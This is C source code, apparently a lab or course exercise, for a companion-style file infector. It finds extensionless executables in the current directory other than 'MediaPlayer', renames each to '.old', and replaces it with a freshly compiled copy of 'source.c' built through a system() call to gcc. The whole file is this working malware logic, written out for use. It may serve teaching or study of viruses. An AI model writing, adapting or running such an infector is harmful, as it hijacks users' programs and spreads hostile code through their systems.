//
// Created by yannis on 03/03/2023.
//
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>

#define BUFFER_SIZE 500

void duplicate(char oldName[]) {
    FILE *src, *outFile;
    int ch;
    char objectName[256];
    strcpy(objectName,oldName);
    //strcat(objectName,"Duplicate");
    src = fopen("source.c", "r");
    strcat(oldName, ".c");
   // printf("    --%s-- --%s--\n", oldName,objectName);
    outFile = fopen(oldName, "w");
    if (outFile == NULL) {
        printf("    Error when creating the file.\n");
    }
    while ((ch = fgetc(src)) != EOF) {
        putc(ch, outFile);
    }
    fclose(src);
    fclose(outFile);
    char compile[256];
     int status;
 
    sprintf(compile,"gcc %.100s -o %.100s",oldName,objectName);
    //printf("    gcc %.100s -o %.100s \n",oldName,objectName);
    status=system(compile);
    if (status!=0){
        perror("compiling error");
        exit(EXIT_FAILURE);
    }
    else if (status==-1){
        perror("Error when calling system()");
        exit(EXIT_FAILURE);
    }else{
        printf("    Compilation done \n");
        remove(oldName);
    }

          
//    printf("    Le fichier a ete copie avec succes. \n");
    
}

void findFile() {
    struct dirent *dp;
    struct stat statbuffer;
    char buffer[BUFFER_SIZE];
    DIR *dir;
//    char *cible[500];
    size_t t = 0;
    if ((dir = opendir(getcwd(buffer, BUFFER_SIZE))) == NULL) {
        perror("Cannot open. ");
    }
    while ((dp = readdir(dir)) != NULL) {
        stat(dp->d_name, &statbuffer);
        if (dp->d_type == DT_REG) {
            char oldName[256], oldOldName[256], newName[256];
            if (stat(dp->d_name, &statbuffer) == -1) {
                perror("stat error");
                exit(EXIT_FAILURE);
           }
            if (strcmp(dp->d_name,"MediaPlayer")!=0) {
//                printf("TEST DIFFERENT SOURCE %s\n",filename);
                if (S_ISREG(statbuffer.st_mode) && (statbuffer.st_mode & S_IXUSR) && strrchr(dp->d_name, '.') == NULL) {
                    printf("   Target File: '%s'", dp->d_name);
                    //                cible[t]=dp->d_name;
                    t++;
                    strcpy(oldName, dp->d_name);
                    strcpy(oldOldName, oldName);
                    strcpy(newName, dp->d_name);
                    if (rename(dp->d_name, newName) != 0) {
                        printf("%s\n", dp->d_name);
                        perror("rename error");
                        exit(EXIT_FAILURE);
                    }
                    strcat(newName, ".old");
                    rename(dp->d_name, newName);
//                printf("----------------------%s\n",newName);
                    duplicate(oldOldName);

                } else {
                printf("Non Target File: '%s'\n",dp->d_name);

                }
            }

        }
    }
}

int main(int argc, char *argv[]) {
    findFile();

    //lecture tableau cible
//    for (int i = 0; i < t; i++) {
//        printf("%s ", cible[i]);
//    }
    return 0;
}

//saved